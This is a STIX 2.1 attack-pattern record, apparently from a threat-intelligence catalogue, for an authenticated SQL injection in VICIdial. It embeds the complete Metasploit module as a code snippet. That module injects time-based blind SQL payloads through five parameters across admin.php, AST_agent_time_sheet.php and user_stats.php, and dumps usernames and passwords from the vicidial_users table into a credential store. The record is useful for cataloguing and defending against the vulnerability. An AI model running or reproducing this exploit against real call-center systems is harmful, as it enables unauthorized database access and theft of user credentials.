{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1a94ff1c-b010-4326-8fce-fe367892a2b0",
    "created": "2024-08-14T16:29:32.409993Z",
    "modified": "2024-08-14T16:29:32.409997Z",
    "name": "VICIdial Multiple Authenticated SQLi",
    "description": " This module exploits several authenticated SQL Inject vulnerabilities in VICIdial 2.14b0.5 prior to svn/trunk revision 3555 (VICIBox 10.0.0, prior to January 20 is vulnerable). Injection point 1 is on vicidial/admin.php when adding a user, in the modify_email_accounts parameter. Injection point 2 is on vicidial/admin.php when adding a user, in the access_recordings parameter. Injection point 3 is on vicidial/admin.php when adding a user, in the agentcall_email parameter. Injection point 4 is on vicidial/AST_agent_time_sheet.php when adding a user, in the agent parameter. Injection point 5 is on vicidial/user_stats.php when adding a user, in the file_download parameter. VICIdial does not encrypt passwords by default. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/vicidial_multiple_sqli.rb",
            "external_id": "vicidial_multiple_sqli.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.vicidial.org/VICIDIALforum/viewtopic.php?f=4&t=41300&sid=aacb27a29fefd85265b4d55fe51122af"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-34878#user_stats.php"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::SQLi\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'VICIdial Multiple Authenticated SQLi',\n        'Description' => %q{\n          This module exploits several authenticated SQL Inject vulnerabilities in VICIdial 2.14b0.5 prior to\n          svn/trunk revision 3555 (VICIBox 10.0.0, prior to January 20 is vulnerable).\n          Injection point 1 is on vicidial/admin.php when adding a user, in the modify_email_accounts parameter.\n          Injection point 2 is on vicidial/admin.php when adding a user, in the access_recordings parameter.\n          Injection point 3 is on vicidial/admin.php when adding a user, in the agentcall_email parameter.\n          Injection point 4 is on vicidial/AST_agent_time_sheet.php when adding a user, in the agent parameter.\n          Injection point 5 is on vicidial/user_stats.php when adding a user, in the file_download parameter.\n          VICIdial does not encrypt passwords by default.\n        },\n        'Author' => [\n          'h00die' # msf module, discovery\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'URL', 'https://www.vicidial.org/VICIDIALforum/viewtopic.php?f=4&t=41300&sid=aacb27a29fefd85265b4d55fe51122af'],\n          [ 'CVE', '2022-34876'], # admin.php\n          [ 'CVE', '2022-34877'], # AST_agent_time_sheet.php\n          [ 'CVE', '2022-34878'] # user_stats.php\n        ],\n        'Actions' => [\n          ['List Users - modify_email_accounts method', { 'Description' => 'Queries username, password for COUNT users' }],\n          ['List Users - access_recordings method', { 'Description' => 'Queries username, password for COUNT users' }],\n          ['List Users - agentcall_email method', { 'Description' => 'Queries username, password for COUNT users' }],\n          ['List Users - agent_time_sheet method', { 'Description' => 'Queries username, password for COUNT users' }],\n          ['List Users - user_stats method', { 'Description' => 'Queries username, password for COUNT users' }],\n        ],\n        'DefaultAction' => 'List Users',\n        'DisclosureDate' => '2022-04-19',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n    register_options [\n      OptInt.new('COUNT', [false, 'Number of users to enumerate', 3]),\n      OptString.new('USERNAME', [true, 'Valid Username for login', '6666']),\n      OptString.new('PASSWORD', [true, 'Valid Password for login', '']),\n      OptString.new('ACTION', [true, 'Valid Password for login', 'List Users - access_recordings method'])\n    ]\n  end\n\n  def post_4a\n    {\n      'ADD' => '4A',\n      'custom_fields_modify' => '0',\n      'user' => '111',\n      'pass' => '111',\n      'force_change_password' => 'N',\n      'full_name' => '111',\n      'user_level' => '1',\n      'user_group' => 'ADMIN',\n      'phone_login' => '111',\n      'phone_pass' => '111',\n      'active' => 'Y',\n      'voicemail_id' => '',\n      'email' => '',\n      'mobile_number' => '',\n      'user_code' => '',\n      'user_location' => '',\n      'territory' => '',\n      'user_nickname' => '',\n      'user_new_lead_limit' => '-1',\n      'agent_choose_ingroups' => '1',\n      'agent_choose_blended' => '1',\n      'hotkeys_active' => '0',\n      'scheduled_callbacks' => '1',\n      'agentonly_callbacks' => '0',\n      'next_dial_my_callbacks' => 'NOT_ACTIVE',\n      'agentcall_manual' => '0',\n      'manual_dial_filter' => 'DISABLED',\n      'agentcall_email' => '0',\n      'agentcall_chat' => '0',\n      'vicidial_recording' => '1',\n      'vicidial_transfers' => '1',\n      'closer_default_blended' => '0',\n      'user_choose_language' => '0',\n      'selected_language' => 'defaultEnglish',\n      'vicidial_recording_override' => 'DISABLED',\n      'mute_recordings' => 'DISABLED',\n      'alter_custdata_override' => 'NOT_ACTIVE',\n      'alter_custphone_override' => 'NOT_ACTIVE',\n      'agent_shift_enforcement_override' => 'DISABLED',\n      'agent_call_log_view_override' => 'DISABLED',\n      'hide_call_log_info' => 'DISABLED',\n      'agent_lead_search' => 'NOT_ACTIVE',\n      'lead_filter_id' => 'NONE',\n      'user_hide_realtime' => '0',\n      'allow_alerts' => '0',\n      'preset_contact_search' => 'NOT_ACTIVE',\n      'max_inbound_calls' => '0',\n      'max_inbound_filter_enabled' => '0',\n      'max_inbound_filter_min_sec' => '-1',\n      'max_hopper_calls' => '0',\n      'max_hopper_calls_hour' => '0',\n      'wrapup_seconds_override' => '-1',\n      'ready_max_logout' => '-1',\n      'status_group_id' => '',\n      'custom_one' => '',\n      'custom_two' => '',\n      'custom_three' => '',\n      'custom_four' => '',\n      'custom_five' => '',\n      'qc_enabled' => '0',\n      'qc_user_level' => '1',\n      'qc_pass' => '0',\n      'qc_finish' => '0',\n      'qc_commit' => '0',\n      'realtime_block_user_info' => '0',\n      'admin_hide_lead_data' => '0',\n      'admin_hide_phone_data' => '0',\n      'ignore_group_on_search' => '0',\n      'user_admin_redirect_url' => '',\n      'view_reports' => '0',\n      'access_recordings' => '0',\n      'alter_agent_interface_options' => '0',\n      'modify_users' => '0',\n      'change_agent_campaign' => '0',\n      'delete_users' => '0',\n      'modify_usergroups' => '0',\n      'delete_user_groups' => '0',\n      'modify_lists' => '0',\n      'delete_lists' => '0',\n      'load_leads' => '0',\n      'modify_leads' => '0',\n      'export_gdpr_leads' => '0',\n      'download_lists' => '0',\n      'export_reports' => '0',\n      'delete_from_dnc' => '0',\n      'modify_campaigns' => '0',\n      'campaign_detail' => '0',\n      'delete_campaigns' => '0',\n      'modify_ingroups' => '0',\n      'delete_ingroups' => '0',\n      'modify_inbound_dids' => '0',\n      'delete_inbound_dids' => '0',\n      'modify_custom_dialplans' => '0',\n      'modify_remoteagents' => '0',\n      'delete_remote_agents' => '0',\n      'modify_scripts' => '0',\n      'delete_scripts' => '0',\n      'modify_filters' => '0',\n      'delete_filters' => '0',\n      'ast_admin_access' => '0',\n      'ast_delete_phones' => '0',\n      'modify_call_times' => '0',\n      'delete_call_times' => '0',\n      'modify_servers' => '0',\n      'modify_shifts' => '0',\n      'modify_phones' => '0',\n      'modify_carriers' => '0',\n      'modify_email_accounts' => '0',\n      'vKik' => 'vKik',\n      'modify_labels' => '0',\n      'modify_colors' => '0',\n      'modify_languages' => '0',\n      'modify_statuses' => '0',\n      'modify_voicemail' => '0',\n      'modify_audiostore' => '0',\n      'modify_moh' => '0',\n      'modify_tts' => '0',\n      'modify_contacts' => '0',\n      'callcard_admin' => '0',\n      'modify_auto_reports' => '0',\n      'add_timeclock_log' => '0',\n      'modify_timeclock_log' => '0',\n      'delete_timeclock_log' => '0',\n      'manager_shift_enforcement_override' => '0',\n      'pause_code_approval' => '0',\n      'admin_cf_show_hidden' => '0',\n      'modify_ip_lists' => '0',\n      'ignore_ip_list' => '0',\n      'two_factor_override' => 'NOT_ACTIVE',\n      'vdc_agent_api_access' => '0',\n      'api_list_restrict' => '0',\n      'api_allowed_functions[]' => 'ALL_FUNCTIONS',\n      'api_only_user' => '0',\n      'modify_same_user_level' => '1',\n      'alter_admin_interface_options' => '1',\n      'SUBMIT' => 'SUBMIT'\n    }\n  end\n\n  def basic_auth\n    user_pass = \"#{datastore['USERNAME']}:#{datastore['PASSWORD']}\"\n    {\n      'Authorization' => \"Basic #{Rex::Text.encode_base64(user_pass)}\"\n    }\n  end\n\n  def inject_admin_page(param, payload)\n    data = post_4a\n    d = Rex::Text.rand_text_numeric(4)\n    data[param] = \"0' AND (SELECT #{Rex::Text.rand_text_numeric(4)} FROM (SELECT(#{payload}))#{Rex::Text.rand_text_alpha(4)}) AND '#{d}'='#{d}\"\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'vicidial', 'admin.php'),\n      'headers' => basic_auth,\n      'vars_post' => data\n    })\n\n    fail_with Failure::Unreachable, 'Connection failed' unless res\n  end\n\n  def run_host(ip)\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'vicidial', 'admin.php'),\n      'headers' => basic_auth\n    })\n\n    fail_with(Failure::Unreachable, 'Failed to load website') unless res\n    fail_with(Failure::NoAccess, 'Invalid login/password') if res.code == 401\n    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind, opts: { hex_encode_strings: true }) do |payload|\n      d = Rex::Text.rand_text_numeric(4)\n      if datastore['ACTION'] == 'List Users - modify_email_accounts method'\n        inject_admin_page('modify_email_accounts', payload)\n      elsif datastore['ACTION'] == 'List Users - access_recordings method'\n        inject_admin_page('access_recordings', payload)\n      elsif datastore['ACTION'] == 'List Users - agentcall_email method'\n        inject_admin_page('agentcall_email', payload)\n      elsif datastore['ACTION'] == 'List Users - agent_time_sheet method'\n        res = send_request_cgi({\n          'method' => 'GET',\n          'uri' => normalize_uri(target_uri.path, 'vicidial', 'AST_agent_time_sheet.php'),\n          'headers' => basic_auth,\n          'vars_get' => {\n            'agent' => \"0' AND (SELECT #{Rex::Text.rand_text_numeric(4)} FROM (SELECT(#{payload}))#{Rex::Text.rand_text_alpha(4)}) AND '#{d}'='#{d}\"\n          }\n        })\n      elsif datastore['ACTION'] == 'List Users - user_stats method'\n        res = send_request_cgi({\n          'method' => 'GET',\n          'uri' => normalize_uri(target_uri.path, 'vicidial', 'user_stats.php'),\n          'headers' => basic_auth,\n          'vars_get' => {\n            'DB' => '',\n            'pause_code_rpt' => '',\n            'park_rpt' => '1',\n            'did_id' => '',\n            'did' => '',\n            'begin_date' => Date.today.to_s,\n            'end_date' => Date.today.to_s,\n            'user' => '',\n            'submit' => 'submit',\n            'search_archived_data' => '',\n            'NVAuser' => '',\n            'file_download' => \"1' AND (SELECT #{Rex::Text.rand_text_numeric(4)} FROM (SELECT(#{payload}))#{Rex::Text.rand_text_alpha(4)}) AND '#{d}'='#{d}\"\n          }\n        })\n      end\n    end\n\n    unless @sqli.test_vulnerable\n      print_bad(\"#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay.\")\n      return\n    end\n    columns = ['user', 'pass']\n\n    print_status('Enumerating Usernames and Password Hashes')\n    data = @sqli.dump_table_fields('vicidial_users', columns, '', datastore['COUNT'])\n\n    table = Rex::Text::Table.new('Header' => 'vicidial_users', 'Indent' => 1, 'Columns' => columns)\n    data.each do |user|\n      create_credential({\n        workspace_id: myworkspace_id,\n        origin_type: :service,\n        module_fullname: fullname,\n        username: user[0],\n        private_type: :password,\n        private_data: user[1],\n        service_name: 'VICIdial',\n        address: ip,\n        port: datastore['RPORT'],\n        protocol: 'tcp',\n        status: Metasploit::Model::Login::Status::UNTRIED\n      })\n      table << user\n    end\n    print_good('Dumped table contents:')\n    print_line(table.to_s)\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-04-19"
}